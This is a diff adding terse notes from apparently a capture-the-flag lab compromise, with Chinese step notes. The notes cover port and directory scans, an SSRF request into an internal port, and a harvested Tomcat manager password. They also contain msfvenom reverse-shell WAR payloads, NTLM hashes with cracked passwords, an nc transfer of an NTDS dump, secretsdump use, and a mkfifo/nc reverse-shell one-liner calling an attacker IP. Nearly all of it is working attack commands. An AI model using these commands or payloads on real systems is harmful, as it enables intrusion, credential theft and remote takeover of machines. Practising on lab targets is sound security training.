@@ -1,0 +1,49 @@
+nmap  -sC -sV  10.129.100.15 > nmap.txt
+nmap -p- -T5  10.129.100.15 > nmapall.txt
+gobuster dir  -u http://10.129.100.15:8080/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,py,cgi > gobuster.txt
+
+wfuzz -c -z range,1-65535  http://10.129.100.15:60000/url.php?path=http://localhost:FUZZ
+
+
+<user username="admin" password="3@g01PdhB!" roles="manager,manager-gui,admin-gui,manager-script"/>
+
+###1不行 23可用
+msfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.14.26 LPORT=4444 -f war > reverse.war
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.26 LPORT=4444 -f war > reverse1.war
+msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.26 LPORT=4444 -f war > reverse2.war
+
+
+
+python -c "import pty;pty.spawn('/bin/bash')"
+export TERM=xterm
+ctrl+z
+stty raw -echo && fg
+enter
+stty rows 54 && stty columns 235 && export TERM=xterm
+export TERM=xterm
+
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
+atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+
+
+e64fe0f24ba2489c05e64354d74ebd11   f16tomcat!
+2b576acbe6bcfda7294d6bd18041b8fe   Password123!
+
+nc -e 10.10.14.26 < 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
+nc -vnlp 5555 > ntlm.dit
+
+impacket-secretsdump -ntds ntlm.dit -system ntlm.bin LOCAL
+
+
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.26 4445 >/tmp/f
+
+1.掃描全端口,發現6000端口可執行訪問請求
+2.將請求用burp抓出來後,用wfuzz全端口掃描
+3.發現888端口有文件訊息,直接點擊無法訪問,必須將?doc=backup手動添加到請求後方(url-encode)
+http://10.129.1.117:60000/url.php?path=http%3A%2F%2Flocalhost%3A888?doc%3Dbackup
+4.在doc=back取得密碼 tomcat服務的admin帳號密碼
+5.msfvenom 生成jave的 reverse shell war包
+5.登入http://10.129.1.117:8080/manager/html 管理端,部屬 war包後 訪問服務
+6.得到reverse shell 後使用 wget 漏洞取得root權限
